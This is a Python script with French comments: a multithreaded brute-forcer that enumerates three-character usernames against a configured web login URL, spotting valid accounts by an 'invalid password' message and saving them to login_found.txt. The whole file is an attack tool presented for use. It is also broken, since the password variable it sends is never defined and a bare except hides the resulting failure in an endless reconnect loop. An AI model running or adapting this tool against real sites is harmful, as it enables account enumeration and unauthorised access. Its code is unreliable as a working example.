# modules necessaires

import urllib.request as rq
import time
import threading
from config import env 

class Thread(threading.Thread):
    def __init__(self,rec):
        threading.Thread.__init__(self)
        self.rec=rec
    def run(self): 
        crack =  Crack(self.rec)
        crack.run()

class Crack:
    def __init__(self,rec):
        self.num_login_found=0
        self.rec=rec
        self.lettre_optimiz='qwertyuiopasdfghjklzxcvbnm'
        self.num_optimiz='0123456789'
        self.Lettre_optimiz='QWERTYUIOPASDFGHJKLZXCVBNM'
        self.special_optimiz='~!@#$%^&*()_+{`}"|?><:;\'[]=-\\'
        self.space_optimiz=' '
        self.num_login_found=0
        self.lettre_len=25
        self.Lettre_len=25
        self.num_len=9
        self.special_len=28
        self.lettre=self.lettre_optimiz+self.num_optimiz+self.space_optimiz
        self.long=self.lettre_len
        self.bou=1
        self.repo5=4
        self.num=env.longeur_du_code
        self.long2=0
        self.long3=0
        self.x,self.y,self.z,self.u=0,0,0,0        

        
    def run(self):
        # algo pour traiter les decalage
        if self.rec==1:
            self.long2=0
            self.long3=2
        elif 2<=self.rec<=36:
            self.long2=self.rec
            self.long3=self.rec+2
        self.x=self.long2
        while 1:
            self.bou=1
            self.t1=time.time()
            self.user=(self.lettre[self.x]+self.lettre[self.y]+self.lettre[self.z])
            self.x+=1
            # coeur du moteur... va permettre la generation ordonner des logins
            if self.x==self.long3:
                self.x=self.long2
                self.y+=1
                if self.num==1:
                        break
                else:
                        pass
            elif self.y==self.long:
                self.x=self.long2
                self.y=0
                self.z+=1
                if self.num==2:
                        break
                else:
                        pass
            elif self.z==self.long:
                    self.x=self.long2
                    self.y=0
                    self.z=0
                    self.u+=1
                    if self.num==3:
                            break
                    else :
                            pass
            elif self.u==self.long:
                    if self.num==4:
                            break 

            # envoye ; reception ; et traitement automatique des requetes HTTP
            while self.bou==1:
                try:
                    self.req=rq.Request(env.url_login+self.user+env.url_pass+self.passw)
                    self.r=rq.urlopen(self.req)
                    self.bou = 0
                except:
                    print("connexion perdu, reconnexion...",end="\r")
            # algo pour calculer le debit du bruteforce
            self.t2=time.time()
            self.t4=int(((self.t2-self.t1)*(36**3))//60)
            self.t3=int((1/(self.t2-self.t1))*18)
            # les logins corrects seront automatiquement ecrit dans un fichier nommer login_found.txt
            if env.invalid_password_error_msg in str(self.r.read()):
                self.num_login_found+=1
                print(self.user+"\n")
                with open("login_found.txt",'a') as f:
                    f.write(self.user+"\n")
            else :
                print("login {} incorrect ||  {}  login/sec || {} min restant ".format(self.user,self.t3,self.t4),end="\r")

rec = (1,2,4,6,8,10,12,14,16,18,20,22,24,26,28,30,32,34)

for i in rec:
    t=Thread(i)
    t.start()
    time.sleep(0.1)

print("fermeture du moteur ,bye ")
time.sleep(2)
exit()

if __name__ == '__main__':
    pass